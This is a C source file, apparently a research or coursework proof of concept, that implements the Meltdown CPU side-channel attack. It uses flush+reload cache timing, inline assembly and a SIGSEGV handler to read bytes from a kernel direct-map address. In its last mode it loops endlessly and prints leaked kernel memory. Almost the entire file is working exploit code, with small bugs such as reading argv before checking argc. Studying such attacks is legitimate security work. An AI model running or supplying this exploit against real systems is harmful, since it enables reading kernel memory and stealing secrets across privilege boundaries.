#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <ctype.h>
#include <limits.h>
#include <unistd.h> 
#include <sys/wait.h>
#include <malloc.h>
#include <signal.h>
#include <errno.h>
#include <sys/mman.h>
#include <setjmp.h>
#include <signal.h>
#include "functions.h"

// kernel start location
// if there is no KASLR
//#define PHYS_OFFSET   0xffffffff820001e0ul
#define PHYS_OFFSET 0xFFFF880000000000ul
//#define PHYS_OFFSET 0xFFFF8800e01d8140ul                               
#define MELTDOWN "?!? MELTDOWN ?!?"

#define THRESHOLD 140

// SIGNAL HANDLERS
static jmp_buf trycatch_buf;


void unblock_signal(int signum __attribute__((__unused__))) {
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, signum);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

void trycatch_segfault_handler(int signum) {
  (void)signum;
  unblock_signal(SIGSEGV);
  unblock_signal(SIGFPE);
  longjmp(trycatch_buf, 1);
}



void flushprobe(uint64_t* probe_array){
    // flush them all
    for (int i = 0; i < 256 * 512; i++)
    {
        asm volatile(
            "clflush (%0)"
            // out
            :
            // in
            :"r"(&probe_array[i]) 
        );
    }
}

void test_flushprobe(uint64_t* probe_array){

    register uint64_t delta;
    uint64_t* differenceArray = (uint64_t *) malloc (256 * sizeof(uint64_t));

    for (int i = 0; i < 256; i++)
    {
        asm volatile(
            "mfence\n"
            "rdtscp\n"
            "mov %%rax, %%r10\n"
            // access to the array, read array's element to rcx
            "mov (%1), %%rcx\n"
            // read the timer again
            "rdtscp;\n"
            // find the difference between measurements
            "sub %%r10, %%rax\n"
            // output
            : [delta]"=a"(delta)
            // input
            :"b"(&probe_array[i * 512])
        );
        differenceArray[i] = delta;
    }
    
    for (int i = 0; i < 256; i++)
    {
        printf("difarr[%d]: %ld\n", i, differenceArray[i]);
    }
    
}

uint64_t* prepare_probe(){
    uint64_t * probe_array = (uint64_t *) memalign(4096, 256 * 512 * sizeof(uint64_t));

    // set memory
    for(int i = 0; i < 256 * 512; i++){
        probe_array[i] = i + i;
    }
    return probe_array;
}

void print_usage_message(){
    printf("Usage:\t ./meltdown NUMBER\n");
    printf("Number 0: Testing flush and reload functionality\n");
    printf("Number 1: Testing meltdown with only first location\n");
    printf("Number 2: Testing meltdown without kernel, reading a static string\n");

}


int main(int argc, char * argv[])
{
    
    //char* kernel_pointer = (char *)PHYS_OFFSET;
    
    //uint8_t * kernel_pointer = (uint8_t *)(PHYS_OFFSET);   
    
    

    // actual array
    uint64_t *arr = prepare_probe();
    // pointer for accessing
    uint64_t* probe_array = arr;

    flushprobe(probe_array);
    
    
    
    int argument = atoi(argv[1]);
    if(argc != 2){
        print_usage_message();
        return 1;
    }
    
    // For FnR test
    if(argument == 0){
        printf("First test. Values should be higher\n\n");
        test_flushprobe(probe_array);

        printf("\n\nSecond test. Values should be lower\n\n");
        test_flushprobe(probe_array);
    }
    
    // For a single kernel location test
    if(argument == 1){
        signal(SIGSEGV, trycatch_segfault_handler);
        uint8_t * kernel_pointer = (uint8_t *)(PHYS_OFFSET);   
        // start meltdown only one iteration
        // Dereference the kernel address and encode in LUT
        // Not in cache -> reads load buffer entry
        if (!setjmp(trycatch_buf)) {
        
            asm volatile(
                // clear rax
                "mov $0, %%rax\n"
                "mfence\n"
                // read the value that is pointed by kernel pointer
                // to the rax register
                "movzbl (%1), %%rax\n"
                // race condition begins
                // multiply by 4096
                "shl $12, %%rax\n"
                // compute the probe array address
                "add %%rax, %%rcx\n"
                "mov (%%rcx), %%rdx"
                :"+c"(&probe_array[0])
                :"b"(kernel_pointer)
                :"rax", "rdx"
            );
        }

        register uint64_t delta;
        uint64_t* differenceArray = (uint64_t *) malloc (256 * sizeof(uint64_t));

        // point to the beginning
        probe_array = arr;


        // measure time differences for each element
        for (int i = 0; i < 256; i++)
        {
            asm volatile(
                // start timer
                "rdtscp\n"
                // move counter to the r10
                "mov %%rax, %%r10\n"
                // try to read element of probe array to the rax
                "mov (%1), %%rcx\n"
                // read the timer again
                "rdtscp;\n"
                // find the difference between measurements
                "sub %%r10, %%rax\n"
                // output
                : [delta]"=a"(delta)
                // input
                :"b"(&probe_array[i * 512])
                //:"rax","r10"
                :"rcx"
            );
            differenceArray[i] = delta;
        }
        for (int i = 0; i < 256; i++)
        {
            printf("i: %d\tdelta:%ld\n", i, differenceArray[i]);
        }
    }
    // secret value test
    else if(argument == 2){
        uint8_t * secret = (uint8_t *) malloc(sizeof(MELTDOWN) + 1); 
        strcpy(secret, MELTDOWN);
        //uint8_t * kernel_pointer = (uint8_t *)(PHYS_OFFSET + get_phys_addr(secret));   

        // print secret
        
        // for (int i = 0; i < sizeof(MELTDOWN); i++)
        // {
        //     printf("secret[%d]:%d\t\t%c\taddr:%p\n", i, secret[i], secret[i], &secret[i]);
        //     //printf("secret[%d]:%d\t\t%c\taddr:%p\n", i, *secret, *secret, secret);
        //     // secret++ means increment one byte
        //     //secret++;
        // }
        
    
        int loopCount = 0;
        while(loopCount < 16)
        {
            // point to the beginning
            probe_array = arr;

            // read secret pointer
            asm volatile(
                // clear rax
                "mov $0, %%rax\n"
                "mfence\n"
                // read the value that is pointed by kernel pointer
                // to the rax register

                // move zero extended byte to long
                "movzbl (%1), %%rax\n"
                // race condition begins
                // multiply by 4096
                "shl $12, %%rax\n"
                // compute the probe array address
                "add %%rax, %%rcx\n"
                "mov (%%rcx), %%rdx"
                :"+c"(&probe_array[0])
                :"b"(secret)
                :"rax", "rdx"
            );

            // preparation for measurement 
            register uint64_t delta;
            uint64_t* differenceArray = (uint64_t *) malloc (256 * sizeof(uint64_t));
            
            // point to the beginning
            probe_array = arr;
            // measure time differences for each element
            for (int i = 0; i < 256; i++)
            {
                asm volatile(
                    "mfence\n"
                    "lfence\n"
                    // start timer
                    "rdtscp\n"
                    // move counter to the r10
                    "mov %%rax, %%r10\n"
                    // try to read element of probe array to the rax
                    "mov (%1), %%rcx\n"
                    // read the timer again
                    "rdtscp;\n"
                    // find the difference between measurements
                    "sub %%r10, %%rax\n"
                    // output
                    : [delta]"=a"(delta)
                    // input
                    :"b"(&probe_array[i * 512])
                    //:"rax","r10"
                    :"rcx"
                );
                differenceArray[i] = delta;
            }
            
            // find smallest.
            
            int MIN_TIME = 1000;
            uint64_t smallest = 300;
            for (int i = 0; i < 256; i++)
            {
                if(differenceArray[i] < MIN_TIME){
                    smallest = i;
                    MIN_TIME = differenceArray[i];
                }
            }
            // found, advance
            if(MIN_TIME < THRESHOLD){
                printf("FOUND THE SECRET\n");
                printf("sp:%p \t lc:%d \t item:%ld \t delta:%ld \t %c\n", secret, loopCount, smallest, differenceArray[smallest], smallest);
                secret++;
                loopCount ++;    
            }
            free(differenceArray);
            sleep(0.5);
            flushprobe(arr);
        }
    }
    
    else if(argument == 3){
        // setup signal handler
        signal(SIGSEGV, trycatch_segfault_handler);
        uint8_t * secret = (uint8_t *) malloc(sizeof(MELTDOWN) + 1); 
        strcpy(secret, MELTDOWN);
        uint8_t * kernel_pointer = (uint8_t *)(PHYS_OFFSET + get_phys_addr(secret));   
        
        //printf("pointer:%p\n", kernel_pointer);

        //uint8_t * kernel_pointer = (uint8_t * )PHYS_OFFSET;

        while(1){
           
            int* foundChars =(int*) malloc(sizeof(int) * 256);
            // set all elements to 0
            for (int i = 0; i < 256; i++)
            {
                foundChars[i] = 0;
            }

            int REPT = 10;
            while(REPT){
                // point to the beginning
                probe_array = arr;

                // read kernel pointer
                if (!setjmp(trycatch_buf)) {
                    
                    asm volatile(
                        // clear rax
                        "mov $0, %%rax\n"
                        "mfence\n"
                        // read the value that is pointed by kernel pointer
                        // to the rax register

                        // move zero extended byte to long
                        "movzbl (%1), %%rax\n"
                        // race condition begins
                        // multiply by 4096
                        "shl $12, %%rax\n"
                        // compute the probe array address
                        "add %%rax, %%rcx\n"
                        "mov (%%rcx), %%rdx"
                        :"+c"(&probe_array[0])
                        :"b"(kernel_pointer)
                        :"rax", "rdx"
                    );
                }

                // preparation for measurement 
                register uint64_t delta;
                uint64_t* differenceArray = (uint64_t *) malloc (256 * sizeof(uint64_t));
                
                // point to the beginning
                probe_array = arr;

                // measure time differences for each element
                for (int i = 0; i < 256; i++)
                {
                    asm volatile(
                        "mfence\n"
                        "lfence\n"
                        // start timer
                        "rdtscp\n"
                        // move counter to the r10
                        "mov %%rax, %%r10\n"
                        // try to read element of probe array to the rax
                        "mov (%1), %%rcx\n"
                        // read the timer again
                        "rdtscp;\n"
                        // find the difference between measurements
                        "sub %%r10, %%rax\n"
                        // output
                        : [delta]"=a"(delta)
                        // input
                        :"b"(&probe_array[i * 512])
                        //:"rax","r10"
                        :"rcx"
                    );
                    differenceArray[i] = delta;
                }
                // find smallest.
                int MIN_TIME = 1000;
                uint64_t smallest = 300;
                for (int i = 0; i < 256; i++)
                {
                    if(differenceArray[i] < MIN_TIME){
                        smallest = i;
                        MIN_TIME = differenceArray[i];
                    }
                }
                
                
                if(MIN_TIME < THRESHOLD){
                    foundChars[smallest] +=1;
                }
                free(differenceArray);
                
                flushprobe(arr);
                //printf(";");
                REPT--;
            }

            // print the most repatitive one
            int MAXFOUND = 0;
            int kernelvalue = 0;
            for (int i = 0; i < 256; i++)
            {
                if(foundChars[i] > MAXFOUND){
                    kernelvalue = i;
                    MAXFOUND = foundChars[i];
                }
                //printf("foundChars[%d]:%d\n", i, foundChars[i]);
            }
            printf("%c ",kernelvalue);

            free(foundChars);
            kernel_pointer++;
        }
    }
    
    
    

    return 0;
}